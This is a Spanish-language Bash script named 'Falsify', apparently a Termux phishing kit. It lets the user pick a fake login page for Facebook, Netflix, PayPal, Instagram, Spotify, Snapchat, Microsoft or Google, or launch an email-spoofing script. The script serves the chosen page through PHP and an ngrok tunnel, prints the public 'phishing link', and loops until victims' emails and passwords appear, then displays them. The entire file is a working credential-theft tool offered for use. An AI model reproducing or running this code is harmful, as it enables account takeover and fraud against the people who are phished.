#!/bin/bash
#
# Created by: Informatic in Termux
#
# Falsify
#
# VARIABLES
#
PWD=$(pwd)
source $PWD/Colors.sh
#
# FUNCIONES
#
trap 'printf "\n";stop;exit 1' 2

function Falsify {
	sleep 0.5
	clear
echo -e ${verde}"
███████╗ █████╗ ██╗     ███████╗██╗███████╗██╗   ██╗
██╔════╝██╔══██╗██║     ██╔════╝██║██╔════╝╚██╗ ██╔╝
█████╗  ███████║██║     ███████╗██║█████╗   ╚████╔╝
██╔══╝  ██╔══██║██║     ╚════██║██║██╔══╝    ╚██╔╝
██║     ██║  ██║███████╗███████║██║██║        ██║
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═╝        ╚═╝"${blanco}

echo -e -n "${verde}
┌════════════════════┐   ┌════════════════════┐
█ [${blanco}01${verde}] ┃ ${blanco}FACEBOOK    ${verde}█>>>█ [${blanco}02${verde}] ┃ ${blanco}NETFLIX     ${verde}█
└════════════════════┘   └════════════════════┘
┌════════════════════┐   ┌════════════════════┐
█ [${blanco}03${verde}] ┃ ${blanco}PAYPAL      ${verde}█>>>█ [${blanco}04${verde}] ┃ ${blanco}INSTAGRAM   ${verde}█
└════════════════════┘   └════════════════════┘
┌════════════════════┐   ┌════════════════════┐
█ [${blanco}05${verde}] ┃ ${blanco}SPOTIFY     ${verde}█>>>█ [${blanco}06${verde}] ┃ ${blanco}SNAPCHAT    ${verde}█
└════════════════════┘   └════════════════════┘
┌════════════════════┐   ┌════════════════════┐
█ [${blanco}07${verde}] ┃ ${blanco}MICROSOFT   ${verde}█>>>█ [${blanco}08${verde}] ┃ ${blanco}GOOGLE      ${verde}█
└════════════════════┘   └════════════════════┘
      ┌═════════════════════════════════┐     ┃
┌══<<<█ [${blanco}09${verde}] ┃ ${blanco}FALSIFY ${verde}┃ ${blanco}EMAIL SPOOFING ${verde}█<<<══┘
┃     └═════════════════════════════════┘
┃
└=>>> "${blanco}

read -r opcion

if [[ $opcion == 1 || $opcion == 01 ]]; then
Plantilla="Facebook"
ELIMINAR_INICIAR
elif [[ $opcion == 2 || $opcion == 02 ]]; then
Plantilla="Netflix"
ELIMINAR_INICIAR
elif [[ $opcion == 3 || $opcion == 03 ]]; then
Plantilla="PayPal"
ELIMINAR_INICIAR
elif [[ $opcion == 4 || $opcion == 04 ]]; then
Plantilla="Instagram"
ELIMINAR_INICIAR
elif [[ $opcion == 5 || $opcion == 05 ]]; then
Plantilla="Spotify"
ELIMINAR_INICIAR
elif [[ $opcion == 6 || $opcion == 06 ]]; then
Plantilla="Snapchat"
ELIMINAR_INICIAR
elif [[ $opcion == 7 || $opcion == 07 ]]; then
Plantilla="Microsoft"
ELIMINAR_INICIAR
elif [[ $opcion == 8 || $opcion == 08 ]]; then
Plantilla="Google"
ELIMINAR_INICIAR
elif [[ $opcion == 9 || $opcion == 09 ]]; then
./EmailSpoofing.sh
else
echo -e ${rojo}"
┌═════════════════════┐
█ ${blanco}¡OPCIÓN INCORRECTA! ${rojo}█
└═════════════════════┘
"${blanco}
sleep 1.5
clear
Falsify
fi
}

stop() {
VERIFICAR_NGROK=$(ps aux | grep -o "ngrok" | head -n1)
VERIFICAR_PHP=$(ps aux | grep -o "php" | head -n1)
VERIFICAR_SSH=$(ps aux | grep -o "ssh" | head -n1)
if [[ $VERIFICAR_NGROK == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $VERIFICAR_PHP == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $VERIFICAR_SSH == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

CREDENCIALES() {

usuario=$(grep -o 'Account:.*' Templates/$Plantilla/usernames.txt | cut -d " " -f2)


clave=$(grep -o 'Pass:.*' Templates/$Plantilla/usernames.txt | cut -d ":" -f2)

echo -e "${verde}
┌════════════════════┐
█ ${blanco}CORREO ELECTRÓNICO ${verde}█
└════════════════════┘
┃
└═>>>${blanco} $usuario"
echo -e "${verde}
┌════════════┐
█ ${blanco}CONTRASEÑA ${verde}█
└════════════┘
┃
└═>>>${blanco}$clave"

echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}ESPERANDO CREDENCIALES... ${verde}█
└═══════════════════════════┘"${blanco}
}

start() {

if [[ -e Templates/$Plantilla/usernames.txt ]]; then
rm -rf Templates/$Plantilla/usernames.txt
fi

echo -e "${verde}
┌══════════════════════════════┐
█ ${blanco}GENERANDO ENLACE PHISHING... ${verde}█
└══════════════════════════════┘"${blanco}
cd Templates/$Plantilla && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10
Enlace=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")

echo -e "${verde}┃
└═>>>${blanco} $Enlace"

VERIFICAR_CREDENCIALES
}

ELIMINAR_INICIAR() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

start
}

VERIFICAR_CREDENCIALES() {
echo -e "${verde}
┌═══════════════════════════┐
█ ${blanco}ESPERANDO CREDENCIALES... ${verde}█
└═══════════════════════════┘"${blanco}
while [ true ]; do
if [[ -e "Templates/$Plantilla/usernames.txt" ]]; then
echo -e "${verde}
┌═════════════════════════┐
█ ${blanco}CREDENCIALES CAPTURADAS ${verde}█
└═════════════════════════┘"${blanco}
CREDENCIALES
rm -rf Templates/$Plantilla/usernames.txt
fi
sleep 0.5

done
}
Falsify
